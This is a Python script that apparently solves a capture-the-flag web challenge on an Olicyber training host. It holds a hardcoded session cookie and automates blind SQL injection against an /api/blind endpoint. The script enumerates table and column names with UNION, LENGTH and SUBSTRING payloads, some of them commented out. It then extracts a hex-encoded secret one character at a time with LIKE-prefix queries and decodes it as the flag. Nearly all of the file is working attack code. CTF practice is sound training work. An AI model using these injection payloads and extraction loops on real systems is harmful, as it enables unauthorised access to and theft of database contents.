import requests
import re

URL_BASE = "http://web-17.challs.olicyber.it"

session_cookie = "eyJjc3JmX3Rva2VuIjoiODI1YzY1ZjE5YmI4OTIyYjZkOTRjMTUwN2MzZjg4MzE1MzFkMjc1MSJ9.ai0bTA.HbOPdh8UolnQBJlVFnaDIitc7ZY"

session = requests.session()

session.cookies.update({
    "session": session_cookie
})

page = session.get(f"{URL_BASE}/blind")
csrf_token = re.search(r"csrf_token = '(.+?)'", page.text).group(1)
print(f"CSRF token: {csrf_token}")

#query = "' UNION select 1, version() -- -" # ->SUCCESS, it's PostgreSQL
#query = "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2-- -" #get number of tables
query = "1' AND LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))=11-- -" #get total length

r = session.post(
    f"{URL_BASE}/api/blind",
    json={"query": query},
    headers={"X-CSRFToken": csrf_token}
)

print(r.status_code) 
#print(r.json()) 

''' 
found = ""
for i in range (1, 12):
    for c in ",}{abcdefghijklmnopqrstuvwxyz012345":
        #get table names
        #query = f"1' AND SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),{i},1)='{c}'-- -"

        #get column names
        query = f"1' AND SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='secret'),{i},1)='{c}'-- -"

        r = session.post(
            f"{URL_BASE}/api/blind",
            json={"query": query},
            headers={"X-CSRFToken": csrf_token}
        )
        if(r.status_code == 200 and r.json()["result"] == "Success"):
            found += c
            print(f"Found: {found}")
            break
print(found)
'''

# get asecret column from secret table
dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        query = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        r = session.post(
            f"{URL_BASE}/api/blind",
            json={"query": query},
            headers={"X-CSRFToken": csrf_token}
        )
        if(r.status_code == 200 and r.json()["result"] == "Success"):
            print(f"Found: {c}")
            result += c
            break
    else:
        break # Yup, i cicli for in Python hanno una sezione else.
              # Significa che abbiamo esaurito i caratteri del
              # dizionario.

flag = bytes.fromhex(result).decode("utf-8")
print(flag)